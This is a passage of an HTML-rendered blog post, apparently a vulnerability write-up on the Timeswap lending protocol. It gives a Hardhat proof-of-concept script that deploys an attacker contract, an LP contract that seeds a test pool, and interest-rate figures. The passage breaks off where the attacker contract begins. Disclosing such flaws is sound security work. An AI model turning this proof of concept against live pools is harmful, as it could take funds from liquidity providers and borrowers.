</span><span class=\"mtk12\">usdcb</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">usdc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lpc</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;LP Jtok: &quot;</span><span class=\"mtk1\">+</span><span class=\"mtk12\">jtokb</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;LP USDC: &quot;</span><span class=\"mtk1\">+</span><span class=\"mtk12\">usdcb</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//let txn2 = await lpc.timeswapMint(1641859791, 15, pairAddress)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">res</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pair</span><span class=\"mtk1\">.</span><span class=\"mtk11\">constantProduct</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1641859791</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Post LP Constants:&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">res</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">atakcontrak</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deployAttackersContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">, </span><span class=\"mtk12\">jtok</span><span class=\"mtk1\">, </span><span class=\"mtk12\">usdc</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">jtokb</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">jtok</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">atakcontrak</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">usdcb</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">usdc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">atakcontrak</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Attacker Jtok: &quot;</span><span class=\"mtk1\">+</span><span class=\"mtk12\">jtokb</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Attacker USDC: &quot;</span><span class=\"mtk1\">+</span><span class=\"mtk12\">usdcb</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//mint some tokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">txn2</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">atakcontrak</span><span class=\"mtk1\">.</span><span class=\"mtk11\">timeswapMint</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1641859791</span><span class=\"mtk1\">, </span><span class=\"mtk7\">15</span><span class=\"mtk1\">, </span><span class=\"mtk12\">pairAddress</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">res2</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pair</span><span class=\"mtk1\">.</span><span class=\"mtk11\">constantProduct</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1641859791</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Post Attack Constants:&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">res2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">main</span><span class=\"mtk1\">().</span><span class=\"mtk11\">then</span><span class=\"mtk1\">(()</span><span class=\"mtk4\">=&gt;</span><span class=\"mtk12\">process</span><span class=\"mtk1\">.</span><span class=\"mtk11\">exit</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">))</span></span></span></code></pre>\n<p>First, the LP deploys their pool and contributes their desired amount of tokens with the below contract:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> =</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">4</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;hardhat/console.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">ITimeswapMintCallback</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;./interfaces/callback/ITimeswapMintCallback.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">IPair</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;./interfaces/IPair.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;@openzeppelin/contracts/token/ERC20/IERC20.sol&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">interface</span><span class=\"mtk1\"> </span><span class=\"mtk10\">TestTokenLP</span><span class=\"mtk1\"> </span><span class=\"mtk10\">is</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IERC20</span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mmint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">LP</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ITimeswapMintCallback</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SEC_PER_YEAR</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">31556926</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">TestTokenLP</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">jtok</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">TestTokenLP</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">usdc</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">constructor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_jtok</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_usdc</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">jtok</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">TestTokenLP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_jtok</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">jtok</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mmint</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10_000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">usdc</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">TestTokenLP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_usdc</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">usdc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mmint</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10_000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">timeswapMint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maturity</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">APR</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pairAddress</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maturity</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">maturity</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Maturity: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">maturity</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liquidityTo</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">dueTo</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">xIncrease</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">5_000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">yIncrease</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">APR</span><span class=\"mtk1\">*</span><span class=\"mtk12\">xIncrease</span><span class=\"mtk1\">)/(</span><span class=\"mtk12\">SEC_PER_YEAR</span><span class=\"mtk1\">*</span><span class=\"mtk7\">100</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">zIncrease</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">5</span><span class=\"mtk1\">*</span><span class=\"mtk12\">xIncrease</span><span class=\"mtk1\">)/</span><span class=\"mtk7\">3</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//Static 167% CDP</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">IPair</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pairAddress</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">maturity</span><span class=\"mtk1\">, </span><span class=\"mtk12\">liquidityTo</span><span class=\"mtk1\">, </span><span class=\"mtk12\">dueTo</span><span class=\"mtk1\">, </span><span class=\"mtk12\">xIncrease</span><span class=\"mtk1\">, </span><span class=\"mtk12\">yIncrease</span><span class=\"mtk1\">, </span><span class=\"mtk12\">zIncrease</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">timeswapMintCallback</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assetIn</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralIn</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">external</span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">jtok</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mmint</span><span class=\"mtk1\">(</span><span class=\"mtk7\">100_000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">usdc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mmint</span><span class=\"mtk1\">(</span><span class=\"mtk7\">100_000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Asset requested:&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">assetIn</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Collateral requested:&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateralIn</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//check before</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">beforeJtok</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">jtok</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;LP jtok before&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">beforeJtok</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//transfer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">jtok</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">assetIn</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//check after</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">afterJtok</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">jtok</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;LP jtok after&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">afterJtok</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//check before</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">beforeUsdc</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">usdc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;LP USDC  before&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">beforeUsdc</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//transfer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">usdc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateralIn</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//check after</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">afterUsdc</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">usdc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;LP USDC After&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">afterUsdc</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Here are the initialization values:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">xIncrease</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">5_000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">yIncrease</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">APR</span><span class=\"mtk1\">*</span><span class=\"mtk12\">xIncrease</span><span class=\"mtk1\">)/(</span><span class=\"mtk12\">SEC_PER_YEAR</span><span class=\"mtk1\">*</span><span class=\"mtk7\">100</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">zIncrease</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">5</span><span class=\"mtk1\">*</span><span class=\"mtk12\">xIncrease</span><span class=\"mtk1\">)/</span><span class=\"mtk7\">3</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//Static 167% CDP</span></span></span></code></pre>\n<p>With this configuration, I’ve calculated the interest rate to borrow on this pool using the functions defined here: <a href=\"https://timeswap.gitbook.io/timeswap/deep-dive/borrowing\">https://timeswap.gitbook.io/timeswap/deep-dive/borrowing</a>\nto  be:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">yMax: 4.7533146923118e-06</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Min Interest Rate: 0.009374999999999765</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Max Interest Rate: 0.14999999999999625</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">zMax: 1666.6666666666667</span></span></code></pre>\n<p>Around 1% to 15%.</p>\n<p>Then, the attacker comes along (see line containing <code>let atakcontrak</code> and after). The attacker deploys the following contract:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> =</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">4</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;hardhat/console.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">ITimeswapMintCallback</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;./interfaces/callback/ITimeswapMintCallback.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">IPair</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;./interfaces/IPair.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;@openzeppelin/contracts/token/ERC20/IERC20.sol&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">interface</span><span class=\"mtk1\"> </span><span class=\"mtk10\">TestTokenAtt</span><span class=\"mtk1\"> </span><span class=\"mtk10\">is</span><span 